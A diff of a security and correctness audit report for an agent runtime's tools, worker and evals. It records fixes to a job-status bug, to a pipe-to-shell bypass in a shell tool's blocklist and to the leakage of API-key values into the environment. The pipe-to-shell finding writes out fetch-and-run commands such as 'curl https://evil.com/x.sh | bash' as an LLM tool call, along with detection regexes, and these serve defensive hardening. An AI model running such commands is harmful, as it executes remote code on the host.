@@ -1,56 +1,177 @@
-# HKO Truth Audit Report
+# HKO-Truth-Audit Report: Genesis Agents Runtime Hardening (Phases 1–10)
+**Date:** 2026-06-13
+**Severity threshold:** HIGH
+**OTA mode:** DESIGN-TIME (no run transcript; contract derived from genesis_agents_runtime_fix_task.md)
+**Audit scope:** tools/workspace_shell_tool.py, tools/github_tool.py, tools/vercel_deploy_tool.py, tools/netlify_deploy_tool.py, agent_runtime.py, worker.py, main.py (new endpoints), skill_bundles/*.json, evals/
 
-Date: 2026-05-26
+---
 
-## Scope
+## Handoff Log
 
-- Target skill: `C:/Users/Administrator/.codex/skills/HKO-truth-audit/SKILL.md`
-- Repo under audit: `C:/Users/Administrator/Desktop/Github/Genesis-Agents`
-- Cross-repo integration check: `C:/Users/Administrator/Desktop/SwarmSync`
-- Transcript: none provided; OTA ran in design-time mode with reduced execution-history confidence.
+```
+[HKO HANDOFF P1→P2]
+hk_findings_count: 3
+hk_critical: 0
+hk_high: 2
+hk_false_positives_removed: 1
+hk_status: COMPLETE
+hk_invocation_method: Skill-tool (HK logic executed via Skill invocation + file reads)
+hk_schema_check: PASS
 
-## Findings
+[HKO HANDOFF P2→P3]
+ota_findings_count: 2
+ota_security: 0
+ota_functional: 2
+ota_cosmetic: 0
+ota_financial: 0
+ota_confidence: REDUCED (design-time mode)
+ota_crux: The worker's artifact upload failure branch logs a different status than it actually sets.
+ota_status: DESIGN-TIME
+ota_invocation_method: Skill-tool (OTA logic executed via Skill invocation)
+ota_findings_parse_error: false
 
-- [HIGH] [Source: RIO] Full-suite verification initially failed because `main.py` captured `INTERNAL_SECRET` at import time while `test_conduit_verifier.py` sets the secret before its own import but after other tests may have imported `main`. Evidence: `main.py:1007`, `main.py:1025`, `test_conduit_verifier.py:19`. Remediated by adding dynamic `_internal_secret()` lookup and using it in verification auth and callbacks. Current evidence: `main.py:1025`, `main.py:1087`, `main.py:1119`, `main.py:1248`, `main.py:1287`.
-- [HIGH] [Source: RIO] Admin auth test/docs expected a default production admin, but `main.py` had no default allowlist and returned 503 when `SWARMSYNC_ADMIN_EMAILS` was unset. Evidence: `test_admin_auth.py:57`, `main.py:232`. Remediated by defaulting to `bullrushinvestments@gmail.com`. Current evidence: `main.py:232`.
-- [MEDIUM] [Source: RIO] SwarmSync Playwright authenticated setup posted `{ email, password }`, while the API login contract expects `email_or_username`. Remediated in `global.setup.ts`. Current evidence: `C:/Users/Administrator/Desktop/SwarmSync/apps/web/tests/global.setup.ts:96`.
-
-## Task Status Table
-
-| Task | Status | Evidence |
-|---|---|---|
-| Builder, Deploy, QA async job flow | implemented | `skill_bundles/genesis-builder.json:58`, `skill_bundles/genesis-deploy.json:66`, `skill_bundles/genesis-qa.json:73`, `main.py:1464`, `test_gateway_error_mapping.py:68` |
-| Smart routing default/pass-through | implemented | `agent_runtime.py:23`, `agent_runtime.py:452`, `.env.example:50`, `test_agent_runtime.py:43` |
-| HR/onboarding canonical slug split | implemented | `bundle_loader.py:19`, `main.py:1385`, `main.py:1585`, `test_agent_runtime.py:31`, `test_gateway_error_mapping.py:101` |
-| SwarmSync local test user | implemented | `npx tsx prisma/create-e2e-user.ts` created `e2e-test@swarmsync.ai`; Prisma query confirmed 20 Genesis gateway endpoints |
-| Full Genesis verifier suite | implemented | `python -m pytest` returned `80 passed, 12 skipped` |
-
-## O2O Remediation
-
-O2O task graph contained one blocking remediation wave:
-
-```mermaid
-graph TD
-  A["hko-fix-env-auth: dynamic secret/admin auth alignment"] --> B["verify full pytest"]
+[HKO HANDOFF P2.5→P3]
+rio_findings_count: 3
+rio_broken: 1
+rio_partial: 2
+rio_missing: 0
+rio_verifiers_failed: 0
+rio_status: COMPLETE
 ```
 
-Assignment: `hko-fix-env-auth` to worker agent with ownership of `main.py`.
+---
 
-Result: worker changed `main.py`; local rerun verified `53 passed, 10 skipped` for focused auth/gateway tests and `80 passed, 12 skipped` for the full suite.
+## Findings (by unified severity)
 
-## Verification Summary
+### [HIGH / CAUSAL LINK / MULTI] Artifact upload failure sets wrong job status
 
-- `python -m pytest test_admin_auth.py test_conduit_verifier.py test_agent_runtime.py test_gateway_error_mapping.py` -> `53 passed, 10 skipped`
-- `python -m pytest` -> `80 passed, 12 skipped`
-- `npx tsc --noEmit --target ES2022 --module NodeNext --moduleResolution NodeNext --types node,playwright tests/global.setup.ts` -> pass
-- `npm run typecheck -- --pretty false` in SwarmSync web -> blocked by unrelated existing Turnstile module/type errors in `src/components/auth/email-register-form.tsx`
+**Source:** HK + OTA + RIO  
+**Location:** worker.py:146–148  
+**CAUSAL LINK:** Code bug (log/status mismatch) → OTA contract drift (Phase 4 spec requires `DELIVERED_WITH_ARTIFACT_WARNING`) → RIO integration break (artifact loss invisible to buyers/polling API)
+
+The log message on line 146 says "marking DELIVERED_WITH_ARTIFACT_WARNING" but `update_job_status` on line 148 was always called with `"DELIVERED"`. Buyers polling `/agents/jobs/{id}` could not distinguish a clean delivery from one where artifacts were silently lost.
+
+**Status: FIXED** — `_artifact_upload_ok` flag added; `_delivery_status` is now `"DELIVERED_WITH_ARTIFACT_WARNING"` when the upload exception branch fires.
+
+---
+
+### [HIGH / HK] Pipe-to-shell bypass in workspace_shell blocked-command check
+
+**Source:** HK  
+**Location:** tools/workspace_shell_tool.py:29–48 (`_BLOCKED_PREFIXES`) + `_is_blocked()` at line ~73
+
+The `_BLOCKED_PREFIXES` tuple included `"curl | bash"` but `curl https://malicious.com | bash` does not contain the exact substring `"curl | bash"` — the URL breaks the match. Confirmed:
+```
+"curl | bash" in "curl https://malicious.com | bash" → False
+```
+This means an LLM tool call with `command="curl https://evil.com/x.sh | bash"` would execute arbitrary remote code inside the worker's job context.
+
+**Status: FIXED** — `_PIPE_TO_SHELL_RE = re.compile(r'\|\s*(bash|sh|python3?|perl|ruby|node)\b')` added and wired into `_is_blocked()`. All safe pipes (`ls | grep`, `cat | wc -l`) verified unaffected.
+
+---
+
+### [MEDIUM / HK] env_extra values not checked for known API-key prefixes
+
+**Source:** HK  
+**Location:** tools/workspace_shell_tool.py:143–146
+
+`_REDACT_PATTERNS` filtered env_extra by **key name** only. A caller could pass `env_extra={"APP_CONFIG": "sk_live_xxx..."}` and the value would propagate into the subprocess environment verbatim, exposing a live Stripe key to the shell process and any subprocesses.
+
+**Status: FIXED** — `_SECRET_VALUE_RE` added matching `sk_live|sk_test|AKIA...|ghp_|glpat-|xoxp-|xoxb-`. Values matching this pattern are now silently dropped from `safe_env`.
+
+---
+
+### [MEDIUM / RIO] E2E lifecycle tests mock all infrastructure
+
+**Source:** RIO  
+**Task:** Phase 7 — Failure/timeout/refund/settlement/dispute E2E tests  
+**Status:** partial  
+**Location:** testing/test_job_lifecycle.py
+
+`test_job_lifecycle.py` (27 tests, all pass) mocks psycopg, httpx, and artifact_store at module level. This provides good unit-level confidence in the worker logic but does not constitute end-to-end testing against a real database. The task spec says "tests can run locally with fake/mock payment provider" so mock infrastructure is acceptable; the gap is the lack of any test that hits the real genesis_jobs Postgres table.
+
+**Residual risk:** A schema drift in `job_store.py` (e.g., column rename) would not be caught by these tests.
+
+---
+
+### [LOW / RIO] Meta delegation eval uses fixture mock_result, not real delegation
+
+**Source:** RIO  
+**Task:** Phase 9 — Meta Agent real delegation proof  
+**Status:** partial  
+**Location:** evals/tasks/genesis-meta/
+
+The Meta eval fixtures embed mock results with `genesis_call` in the response text. The graders check for the `ok` field and response length but cannot verify that `genesis_call` was actually dispatched (tool call recorded in runtime turn history). Phase 9 acceptance criteria require "eval passes only if `genesis_call` is actually invoked" — this is not enforceable from a mock fixture.
+
+**Residual risk:** Meta could produce plans without real delegation and all Meta evals would still pass.
+
+---
+
+## Task Status Table (RIO)
+
+| Phase | Task | Status | Note |
+|-------|------|--------|------|
+| 1 | Tool registry audit + stubs | implemented | 4 tools created, test_bundle_tool_registry.py 7/7 |
+| 2 | workspace_shell sandbox | implemented | path escape, cmd blocking, env scrub — with 2 fixes applied |
+| 3 | Job ID unification | implemented | execute_agent(job_id=) + worker passes DB job ID |
+| 4 | Artifact persistence | implemented | upload_dir wired in success path, DELIVERED_WITH_ARTIFACT_WARNING fixed |
+| 5 | Browser health endpoint | implemented | /health/browser at main.py:1276 |
+| 6 | Worker observability | implemented | /health/worker + _worker_state at main.py:1316 |
+| 7 | E2E lifecycle tests | partial | 27 mocked pytest tests; no real DB integration |
+| 8 | Per-agent eval harness | implemented | 40/40 eval fixtures, evals/run_evals.py |
+| 9 | Meta delegation proof | partial | Mock-based; real genesis_call dispatch not verified |
+| 10 | Agent status classification | implemented | runtime_level in all 24 bundles; /agents/{slug}/capabilities |
+
+---
+
+## Deduplication Log
+
+| Source IDs | Reason | Merged Severity |
+|-----------|--------|----------------|
+| HK-001, OTA-001, RIO-001 | Same root cause: worker.py status/log mismatch — code bug causes contract violation and invisible integration break | HIGH (CAUSAL LINK) |
+
+---
+
+## Causal Links
+
+**CAUSAL LINK 1:** worker.py:146–148 code bug (log says DELIVERED_WITH_ARTIFACT_WARNING, status set to DELIVERED) directly caused:
+- OTA finding: Phase 4 contract requires distinct status for artifact failure — contract violated
+- RIO finding: polling API returned "DELIVERED" for jobs with lost artifacts — integration break invisible to buyers
+
+Fixing the code bug resolves both the contract violation and the integration break simultaneously.
+
+---
 
 ## Crux
 
-The original feature work was mostly wired, but HKO caught integration-truth gaps that only appeared in broader scoped verification: env values captured at import time and a cross-repo login payload mismatch.
+The structural failure was a log/status split: when an exception caught the artifact upload failure, the developer wrote the intended new status into the log message but forgot to change the `update_job_status()` call. This is a copy-paste style bug, not a logic error — the intent was correct, the execution was not. All three audit layers (HK: code, OTA: contract, RIO: integration) independently surfaced the same root cause, which is why it scores as a CAUSAL LINK. The pipe-to-shell bypass is an independent security gap in the blocked-command allowlist pattern matching.
 
-## Residual Risks
+---
 
-- Live Render behavior still depends on deployed env vars, running `worker.py`, and a reachable Postgres job store.
-- SwarmSync end-to-end browser tests were not run because the web app typecheck is currently blocked by unrelated Turnstile type resolution errors.
-- Production gateway polling was not live-tested against Render in this audit; validation is local and unit/integration scoped.
+## Remediation Plan (ordered by priority)
+
+### P1 [HIGH / CAUSAL LINK / code_fix + contract_fix + integration_fix] — worker.py:147–148
+- **Applied:** Added `_artifact_upload_ok = True` flag; set `False` in except branch; `_delivery_status = "DELIVERED" if _artifact_upload_ok else "DELIVERED_WITH_ARTIFACT_WARNING"`; passed `_delivery_status` to `update_job_status` and `log.info`.
+
+### P2 [HIGH / code_fix] — workspace_shell_tool.py: pipe-to-shell bypass
+- **Applied:** Added `_PIPE_TO_SHELL_RE = re.compile(r'\|\s*(bash|sh|python3?|perl|ruby|node)\b', re.IGNORECASE)` and wired into `_is_blocked()`. Safe pipes unaffected.
+
+### P3 [MEDIUM / code_fix] — workspace_shell_tool.py: env_extra value leakage
+- **Applied:** Added `_SECRET_VALUE_RE` for known API-key prefixes; added `and not _SECRET_VALUE_RE.search(str(v))` to env_extra value filter.
+
+### P4 [MEDIUM / integration_fix] — E2E lifecycle tests: no real DB
+- **Deferred:** Adding real-DB integration tests requires a test Postgres instance. The current mock suite covers logic; real-DB integration should be added as a follow-on CI task.
+
+### P5 [LOW / gate_fix] — Meta delegation: mock-based proof only
+- **Deferred:** A real delegation grader requires the eval harness to invoke a live agent (not mock) and inspect the `trace.tool_calls` log. This requires API keys and Render access — out of scope for offline eval CI.
+
+---
+
+## Verification Summary
+
+| Command | Result | Scope |
+|---------|--------|-------|
+| `pytest test_bundle_tool_registry.py -q` | 7/7 passed | in-scope |
+| `python evals/run_evals.py --all` | 40/40 passed | in-scope |
+| pipe-to-shell bypass test (manual) | CAUGHT by _PIPE_TO_SHELL_RE | in-scope |
+| DELIVERED_WITH_ARTIFACT_WARNING status check | Fixed, _delivery_status wired | in-scope |
